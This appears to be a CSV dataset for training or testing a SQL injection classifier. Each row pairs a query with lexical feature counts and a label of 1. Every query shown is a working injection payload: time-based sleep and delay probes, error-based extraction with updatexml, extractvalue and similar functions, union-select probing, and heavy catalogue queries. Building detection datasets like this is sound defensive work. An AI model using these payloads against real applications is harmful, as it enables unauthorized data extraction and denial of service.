Query,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,0,0,6,0,0,19,2,1,0,1,2,0,1,0,0,0,1,31,13,0,1
"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",0,1,9,0,0,22,3,1,0,2,4,0,0,0,0,1,2,33,10,1,1
"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,13,0,0,20,2,0,1,2,7,0,0,0,0,0,1,32,13,1,1
"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",0,1,12,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,36,1,1
"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",2,0,12,0,0,27,8,0,0,6,11,0,0,0,5,0,2,77,18,2,1
"-4325' or make_set  (  9354  =  9354,7185  )  ",1,0,5,0,0,8,3,0,0,1,3,0,0,0,0,0,0,9,16,1,1
"1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,13,0,0,27,3,3,0,2,8,0,0,0,0,0,2,87,16,1,1
"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",0,0,12,0,0,26,1,0,0,2,9,0,0,0,0,0,0,41,16,0,1
"1%""   )    )     )   and 7758  =  4792 and    (    (     (  ""%""  =  """,0,4,10,0,0,15,2,0,2,4,8,0,0,0,0,0,0,6,9,4,1
-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,4,0,13,0,0,18,2,0,0,3,7,0,0,0,0,0,0,13,16,4,1
"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",3,0,15,0,0,22,4,1,0,5,9,0,0,0,0,0,0,44,15,3,1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'brhc' like 'brhc,4,0,18,0,0,27,5,1,0,4,5,0,0,0,0,1,2,42,2,4,1
1'+  (  select zwsr where 6567  =  6567,1,0,2,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,1,1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,0,0,8,0,0,18,3,1,0,2,3,0,0,0,0,1,2,28,2,0,1
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,0,0,4,0,0,15,1,2,0,1,2,0,0,0,0,1,0,21,10,0,1
"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1,15,0,0,23,2,3,1,1,6,0,0,0,0,0,1,71,8,1,1
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,0,10,0,0,19,3,1,0,1,2,0,0,0,0,1,2,27,2,1,1
"-4934"" union all select 5119,5119,5119,5119,5119--",0,1,8,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,24,1,1
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,11,0,0,26,3,4,0,2,6,0,0,0,0,0,1,84,9,1,1
"1   )    )    as xovu where 4530  =  4530 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,0,14,0,0,36,2,8,0,1,6,0,0,0,7,0,1,119,20,0,1
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""akha"" like ""akha",0,4,9,0,0,14,5,0,0,5,6,0,0,0,0,0,0,25,13,4,1
-4484'   )    )    or 6872  =  6872 and    (    (   'oxuo'  =  'oxuo,4,0,9,0,0,13,2,0,0,3,6,0,0,0,0,0,0,13,12,4,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",5,0,15,0,0,19,4,1,1,5,8,0,0,0,0,0,1,38,10,5,1
1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',4,0,10,0,0,14,2,1,2,4,7,0,0,0,0,1,0,11,2,4,1
"1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,0,31,0,0,65,16,2,0,4,11,0,2,0,0,0,6,109,63,1,1
"1  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,0,11,0,0,20,7,0,0,7,11,0,0,0,5,0,1,63,10,0,1
1'+  (  select 'upmd' where 3438  =  3438,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,10,0,0,22,2,0,0,1,6,0,0,0,0,0,1,36,21,0,1
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",0,0,18,1,0,24,3,1,0,1,4,0,3,0,0,0,2,37,39,0,1
"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,0,40,0,0,75,2,9,0,1,15,2,0,0,0,0,1,115,43,1,1
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fjwv"" like ""fjwv",0,4,44,0,0,82,5,13,0,6,17,0,0,0,0,0,1,93,47,4,1
-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,1,0,4,0,0,13,1,1,0,1,4,0,0,0,0,0,0,13,20,1,1
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",4,0,30,0,0,50,6,1,0,1,9,0,3,0,0,0,5,71,79,4,1
1'||  (  select 'sbft' where 8748  =  8748,3,0,4,0,0,8,1,0,0,0,3,0,0,0,0,0,1,15,9,3,1
1  )   as mpnj where 5049  =  5049,0,0,1,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
"-9932"" union all select 4049,4049,4049--",0,1,6,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,16,1,1
1   )    )     )   and 2006  =  2006,0,0,3,0,0,8,1,0,0,2,3,0,0,0,0,0,0,3,9,0,1
1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,0,0,8,0,0,21,3,1,0,4,6,0,0,0,0,1,1,23,18,0,1
1'   )    )    and 7533  =  7533 and    (    (   'ialm'  =  'ialm,4,0,8,0,0,13,2,0,0,4,6,0,0,0,0,0,0,14,9,4,1
1  )   where 8320  =  8320 waitfor delay '0:0:5'--,2,0,7,0,0,9,1,1,0,1,4,0,0,0,0,1,0,17,12,2,1
"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji",0,0,9,0,0,21,6,3,0,6,8,0,0,0,0,0,1,69,8,0,1
1   )    )    and sleep  (  5  )   and    (    (   9084  =  9084,0,0,6,0,0,14,2,1,0,4,5,0,0,0,0,1,0,11,10,0,1
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'drvk' like 'drvk",4,0,36,0,0,66,18,1,0,7,11,0,2,0,0,0,6,113,55,4,1
"1   )    )    as oywa where 7951  =  7951 union all select null,null,null,null,null,null#",0,0,7,0,0,13,4,1,0,1,2,6,0,0,0,0,1,49,9,0,1
1'+  (  select kfmv where 1679  =  1679,1,0,2,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,1,1
"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--",0,1,12,0,0,8,4,0,0,1,4,0,0,0,0,0,1,14,28,1,1
if  (  8574  =  7534  )   select 8574 else drop function nxbe--,0,0,4,0,0,12,1,1,0,0,3,0,0,0,0,0,2,28,12,0,1
"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",0,1,9,0,0,13,4,1,0,1,2,7,0,0,0,0,1,53,9,1,1
"-9996' or make_set  (  1237  =  7111,7111  )  ",1,0,5,0,0,8,3,0,0,1,3,0,0,0,0,0,0,9,16,1,1
-1802' or 7931  =  5841--,1,0,4,0,0,5,1,0,0,1,5,0,0,0,0,0,0,2,12,1,1
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",4,0,22,0,0,34,2,0,0,4,12,0,0,0,0,0,0,48,16,4,1
"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,12,0,0,27,2,4,0,2,7,0,0,0,0,0,1,83,16,0,1
"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",0,1,8,0,0,15,2,1,1,1,5,0,0,0,0,1,1,19,10,1,1
"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,12,0,0,30,2,5,0,2,7,0,0,0,0,0,1,83,17,1,1
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",0,0,12,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,44,0,1
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""%""  =  """,0,4,16,0,0,25,4,1,2,3,7,0,0,0,0,1,2,30,2,4,1
 (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,0,0,9,0,0,23,7,2,0,2,4,0,0,0,0,0,2,65,17,0,1
"1""  )   where 7471  =  7471 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1,30,0,0,53,2,7,0,2,16,2,0,0,0,0,0,76,33,1,1
26%,0,0,0,0,0,1,0,0,1,0,1,0,0,0,0,0,0,0,2,0,1
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,0,4,11,0,0,17,2,1,2,4,8,0,0,0,0,1,0,14,10,4,1
"1%'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,0,30,0,0,49,2,7,1,3,17,2,0,0,0,0,0,72,27,1,1
"-1152%'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  '",4,0,40,0,0,76,3,1,2,3,29,0,0,0,0,0,1,83,52,4,1
"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,12,0,0,24,7,0,0,7,12,0,0,0,5,0,1,68,18,1,1
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",4,0,16,0,0,36,3,7,0,1,6,0,0,0,7,0,2,123,20,4,1
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",0,4,28,0,0,43,9,1,0,6,9,0,3,0,0,0,4,63,71,4,1
select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,0,0,10,0,0,22,3,3,0,0,4,0,0,0,0,0,2,53,17,0,1
1' waitfor delay '0:0:5',3,0,5,0,0,4,1,1,0,1,1,0,0,0,0,1,0,12,4,3,1
"1%'   )    )     )   union all select null,null,null,null,null,null,null#",1,0,10,0,0,8,4,0,1,1,2,7,0,0,0,0,1,42,1,1,1
1  )   where 8433  =  8433 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,0,0,9,0,0,25,2,1,0,1,5,0,1,0,0,0,1,36,21,0,1
"1"" where 8016  =  8016",0,1,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"-6145'+  (  select nnjn where 1389  =  1389 union all select 1389,1389,1389--",1,0,7,0,0,12,5,0,0,1,6,0,0,0,0,0,2,29,24,1,1
"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""smnw"" like ""smnw",0,4,37,0,0,75,5,1,0,6,28,0,0,0,0,0,1,104,45,4,1
"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1,0,26,0,0,49,13,2,0,8,11,0,2,0,0,0,3,110,35,1,1
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",1,0,8,0,0,8,4,0,1,1,3,0,0,0,0,0,1,14,20,1,1
1  )   as iknl where 3885  =  3885 rlike sleep  (  5  )  #,0,0,3,0,0,14,1,2,0,1,2,0,0,0,0,1,0,21,10,0,1
1 where 2384  =  2384 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,0,0,8,0,0,22,3,1,0,2,4,0,0,0,0,1,2,33,10,0,1
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",0,1,2,0,0,12,1,1,0,2,4,0,0,0,0,0,0,14,17,1,1
"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,12,0,0,20,7,0,1,6,11,0,0,0,5,0,1,62,10,1,1
select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --,0,0,8,0,0,20,2,1,0,0,4,0,0,0,0,0,2,31,14,0,1
 UNION ALL SELECT,0,0,0,0,0,3,4,0,0,1,1,0,0,0,0,0,1,14,0,0,1
1%' and 7533  =  7533 and '%'  =  ',4,0,4,0,0,9,2,0,2,4,8,0,0,0,0,0,0,6,9,4,1
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",0,4,24,0,0,30,5,1,0,4,5,0,3,0,0,0,2,48,39,4,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat",0,3,12,0,0,19,2,3,0,2,4,0,0,0,0,0,1,80,3,3,1
"1""  )   as mibc where 3113  =  3113",0,1,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",0,1,11,0,0,27,2,7,0,2,4,0,0,0,7,0,1,109,12,1,1
"iif  (  9229  =  4158,1,1/0  )  ",0,0,4,0,0,6,0,0,0,0,2,0,0,0,0,0,0,3,11,0,1
"1%"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,1,6,0,0,12,1,0,1,1,3,0,1,0,0,0,0,17,19,1,1
"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --",0,1,6,0,0,13,1,0,0,2,6,0,0,0,0,0,0,11,21,1,1
"1 and elt  (  2770  =  3669,3669  )  # sfls",0,0,3,0,0,10,1,0,0,2,3,0,0,0,0,0,0,10,13,0,1
"1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --",1,0,6,0,0,13,1,0,0,2,6,0,0,0,0,0,0,11,21,1,1
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'zurf'  =  'zurf",4,0,15,0,0,21,2,0,0,4,6,0,1,0,0,0,0,26,22,4,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",0,3,9,0,0,15,3,0,0,3,4,0,0,0,0,0,1,44,8,3,1
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",0,0,3,1,0,15,5,1,0,1,6,0,0,1,1,0,2,42,3,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",3,0,16,0,0,35,8,1,0,8,11,0,0,0,0,0,2,120,2,3,1
"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",3,0,5,0,0,12,5,0,0,1,4,2,0,0,0,0,2,37,9,3,1
select case when 8867  =  7630 then 1 else null end--,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",0,4,12,0,0,25,3,1,0,3,5,0,1,0,0,0,1,42,13,4,1
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,1,32,0,0,69,2,2,0,2,24,0,0,0,0,0,1,91,45,1,1
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",0,1,30,0,0,67,3,1,0,3,25,0,0,0,0,0,1,89,45,1,1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'swke'  =  'swke",4,0,21,0,0,35,2,2,0,2,4,0,3,0,0,0,1,77,37,4,1
"-1844'  )   union all select 9572,9572,9572,9572#",1,0,6,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,20,1,1
1'   )    )    as hqhs where 5383  =  5383,1,0,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
1'   )    )    as nhkp where 8030  =  8030,1,0,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,11,0,0,19,7,0,1,7,12,0,0,0,5,0,1,63,10,1,1
"1%"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,0,4,42,0,0,91,4,1,2,4,35,0,0,0,0,0,2,104,51,4,1
" end and ""mdje"" like ""mdje",0,3,3,0,0,5,2,0,0,3,3,0,0,0,0,0,0,18,0,3,1
"-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup",4,0,44,0,0,83,5,14,0,4,18,0,0,0,0,0,2,102,50,4,1
"1 where 8389  =  8389 union all select null,null,null,null,null,null,null,null,null,null#",0,0,9,0,0,9,4,0,0,1,2,10,0,0,0,0,1,59,9,0,1
"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",1,0,8,0,0,17,3,1,0,2,6,0,0,0,0,0,0,21,21,1,1
select * from users where id  =  1 %$ . or 1  =  1 -- 1,0,0,3,1,0,16,2,0,1,1,7,0,0,0,1,0,1,24,4,0,1
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,0,0,7,0,0,22,2,1,0,0,2,0,0,0,0,0,2,42,20,0,1
-6030%'  )   or 3038  =  3038,1,0,3,0,0,6,1,0,1,1,4,0,0,0,0,0,0,2,12,1,1
"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",0,0,7,0,0,16,1,1,0,2,6,0,0,0,0,1,0,16,18,0,1
"1'  )   as yhgk where 9246  =  9246 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,23,0,0,43,2,6,0,3,13,1,0,0,0,0,0,64,35,1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",0,3,13,0,0,20,7,3,0,7,8,0,0,0,0,0,1,77,3,3,1
select case when 2930  =  7964 then 1 else null end--,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",1,0,8,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,32,1,1
" select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",0,2,6,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
"-4166%""  )   union all select 5190--",0,1,5,0,0,6,4,0,1,1,5,0,0,0,0,0,1,14,8,1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""%""  =  """,0,3,13,0,0,20,6,3,1,6,9,0,0,0,0,0,1,65,3,3,1
"1""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,1,18,0,0,24,0,1,0,0,0,0,2,0,0,0,0,50,23,1,1
"1 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,0,9,0,0,22,2,4,0,1,5,0,0,0,0,0,1,71,9,0,1
"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",0,4,27,0,0,41,3,2,0,3,4,0,3,0,0,0,1,81,37,4,1
""" or """" """,0,4,4,0,0,4,1,0,0,1,1,0,0,0,0,0,0,2,0,4,1
"1%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""%""  =  """,0,4,32,0,0,62,17,1,2,7,14,0,2,0,0,0,6,102,55,4,1
"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0,21,0,0,36,4,1,0,2,7,0,3,0,0,0,3,49,40,1,1
"1   )    )    as rbae where 2049  =  2049 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,0,15,0,0,26,3,2,0,4,9,0,0,0,0,0,0,42,23,2,1
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",3,0,8,1,0,16,4,1,0,0,6,0,0,0,1,0,2,40,3,3,1
-4637' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,0,36,0,0,72,2,3,0,1,24,0,0,0,0,0,1,74,48,1,1
-7466 where 5161  =  5161 or 3038  =  3038,0,0,1,0,0,9,1,0,0,1,4,0,0,0,0,0,0,7,20,0,1
"1  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,12,0,0,21,2,3,0,1,5,0,0,0,0,0,1,71,8,0,1
1'||  (  select 'sliy' where 9494  =  9494,3,0,4,0,0,8,1,0,0,0,3,0,0,0,0,0,1,15,9,3,1
